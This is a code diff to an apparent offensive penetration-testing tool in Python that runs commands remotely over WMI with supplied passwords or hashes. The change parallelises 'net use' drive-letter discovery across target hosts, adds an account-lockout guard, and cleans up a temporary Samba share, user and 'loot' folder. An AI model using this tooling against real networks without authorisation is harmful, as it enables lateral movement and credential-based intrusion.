@@ -66,7 +66,6 @@ with open('log.txt', 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
 
-outdata = []
 
 ################################################# START OF ATEXEC #########################################################################
 class TSCH_EXEC:
@@ -489,9 +488,9 @@ class RemoteShell(cmd.Cmd):
 
     def send_data(self, data):
         self.execute_remote(data, self.__shell_type)
-        items = re.findall('[A-Z][:]', str(self.__outputBuffer))
-        for item in items:
-            outdata.append(item)
+        with open('drives.txt', 'a') as f: # writing to a file gets around the issue of multithreading not being easily readable
+            f.write(self.__outputBuffer)
+            f.close()
         with open('log.txt', 'a') as f:
             f.write(self.__outputBuffer + '\n')
             f.close()
@@ -738,69 +737,117 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
+def exec_netuse(ip, domain):
+    try:
+        executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
+                           options.k, options.dc_ip, 'cmd')
+        executer.run(ip, False)
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+
+            traceback.print_exc()
+        with open('log.txt', 'a') as f:
+            f.write('{}: {}\n'.format(ip, str(e)))
+            f.close()
+
 def auto_drive(addresses, domain): # really helpful so you dont have to know which drive letter to use
     print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
     failed_logons = 0
-    for ip in addresses:
-        if options.localauth:
-            domain = ip
-        try:
-            executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
-            executer.run(ip, False)
-        except Exception as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
 
-                traceback.print_exc()
-            with open('log.txt', 'a') as f:
-                f.write('{}: {}\n'.format(ip, str(e)))
-                f.close()
+    if len(addresses) > 3 and options.localauth == False: # Anti lockout check
+        for x in range(3):
+            try:
+                executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
+                                   False, options.k, options.dc_ip, 'cmd')
+                executer.run(addresses[x], False)
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
 
-            if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False: # way to track failed logins to see if they're gonna lock the account out
-                logging.error('{}: {}'.format(ip, str(e)))
-                failed_logons += 1
+                    traceback.print_exc()
+                with open('log.txt', 'a') as f:
+                    f.write('{}: {}\n'.format(addresses[x], str(e)))
+                    f.close()
 
-            if failed_logons >= 3 and options.localauth == False:
-                cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
-                if cont.lower() == 'n':
-                    print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
-                    try:
-                        os.system("sudo systemctl stop smbd")
-                    except BaseException as e:
-                        pass
+                if str(e).find(
+                        'STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
+                    logging.error('{}: {}'.format(addresses[x], str(e)))
+                    failed_logons += 1
 
-                    try:
-                        os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
-                    except BaseException as e:
-                        pass
+                if failed_logons >= 3 and options.localauth == False:
+                    cont = input(
+                        '{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(
+                            color_YELL, color_reset, failed_logons))
+                    if cont.lower() == 'n':
+                        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+                        try:
+                            os.system("sudo systemctl stop smbd")
+                        except BaseException as e:
+                            pass
 
-                    try:
-                        os.system("sudo rm " + os.getcwd() + "/smb.conf")
-                    except BaseException as e:
-                        pass
+                        try:
+                            os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+                        except BaseException as e:
+                            pass
 
-                    try:
-                        os.system("sudo userdel " + share_user)
-                    except BaseException as e:
-                        pass
+                        try:
+                            os.system("sudo rm " + os.getcwd() + "/smb.conf")
+                        except BaseException as e:
+                            pass
 
-                    try:
-                        os.system("sudo groupdel " + share_group)
-                    except BaseException as e:
-                        pass
+                        try:
+                            os.system("sudo userdel " + share_user)
+                        except BaseException as e:
+                            pass
 
-                    try:
-                        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
-                    except BaseException as e:
-                        pass
-                    print(
-                        "{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(
-                            color_BLU, color_reset))
-                    exit(0)
-            continue
+                        try:
+                            os.system("sudo groupdel " + share_group)
+                        except BaseException as e:
+                            pass
+
+                        try:
+                            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+                        except BaseException as e:
+                            pass
+                        print(
+                            "{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(
+                                color_BLU, color_reset))
+                        exit(0)
+                continue
+            #end of antilocout check
+            
+    if os.path.isfile('./drives.txt'): # incase they run with localauth to prevent file not found err
+        os.system('sudo rm ./drives.txt')
+    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+        for ip in addresses:
+            if options.localauth:
+                domain = ip
+            try:
+                out = thread_exe.schedule(exec_netuse, (ip, domain,), timeout=25)
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                with open('log.txt', 'a') as f:
+                    f.write(str(e) + '\n')
+                    f.close()
+                logging.error(str(e))
+                continue
+            except KeyboardInterrupt as e:
+                continue
+    outdata = []
+    try:
+        data = '' # read data that was saved to drives.txt into data
+        with open('drives.txt', 'r') as f:
+            data = f.read()
+            f.close()
+        outdata = re.findall('[A-Z][:]', data) # rip out all the A: C: drive letters
+    except BaseException as e:
+        pass
 
     cleaned_outdata = []
-    for drive in outdata:
+    for drive in outdata: # strip the :
         cleaned_outdata.append(drive.replace(":", ""))
 
     inuse_driveletters = []
@@ -808,6 +855,9 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
     for letter in cleaned_outdata:
         if letter not in inuse_driveletters:
             inuse_driveletters.append(letter)
+
+    if os.path.isfile('./drives.txt'): # cleanup that file
+        os.system('sudo rm ./drives.txt')
 
     for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
         if item not in inuse_driveletters and item != 'C' and item != 'D':
